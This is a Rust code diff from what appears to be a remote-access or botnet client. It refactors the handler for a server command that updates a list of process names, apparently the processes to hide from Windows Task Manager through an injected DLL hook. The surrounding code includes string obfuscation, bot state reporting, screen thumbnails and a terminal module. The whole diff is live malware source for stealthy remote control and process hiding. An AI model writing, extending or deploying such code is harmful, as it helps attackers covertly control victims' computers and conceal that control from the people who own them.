@@ -27,7 +27,7 @@ use shared::{
 };
 use obfstr::obfstr as s;
 use crate::{
-    tasks::task_manager_hook::inject_dll,
+    tasks::task_manager_hook::{ inject_dll, update_query_hooker_list },
     utils::{
         system_info::{ generate_bot_state, get_dynamic_info, get_thumbnail },
         terminal::Terminal,
@@ -193,55 +193,7 @@ impl BotHandler {
             }
             receive::ClientAction::UpdateTaskManagerExclusions => {
                 if let ClientParams::UpdateTaskManagerExclusions(params) = processed_data.params {
-                    let file_path = query_hook_exclusions_file_path();
-                    std::fs::create_dir_all(&file_path.parent().unwrap())?;
-
-                    let mut process_names: Vec<String> = if
-                        file_path.exists() &&
-                        file_path.is_file()
-                    {
-                        // load existing
-                        let mut current_content = String::new();
-
-                        let mut file = std::fs::File::open(&file_path)?;
-                        file.read_to_string(&mut current_content)?;
-                        current_content
-                            .split(';')
-                            .map(|exclusion| exclusion.to_string())
-                            .collect()
-                    } else {
-                        std::fs::File::create(&file_path)?;
-                        default_query_hook_exclusions()
-                    };
-
-                    if let Some(override_full) = params.override_full {
-                        process_names = override_full;
-                    } else {
-                        for include in &params.include {
-                            if !process_names.contains(include) {
-                                process_names.push(include.clone());
-                            }
-                        }
-
-                        for exclude in &params.exclude {
-                            if
-                                let Some(index) = process_names
-                                    .iter()
-                                    .position(|line| line == exclude)
-                            {
-                                process_names.remove(index);
-                            }
-                        }
-                    }
-                    let updated_content = process_names.join(";");
-
-                    let mut file = std::fs::OpenOptions
-                        ::new()
-                        .write(true)
-                        .truncate(true)
-                        .open(&file_path)?;
-
-                    file.write_all(updated_content.as_bytes())?;
+                    update_query_hooker_list(params)?;
                 } else {
                     return Err(
                         anyhow::anyhow!(
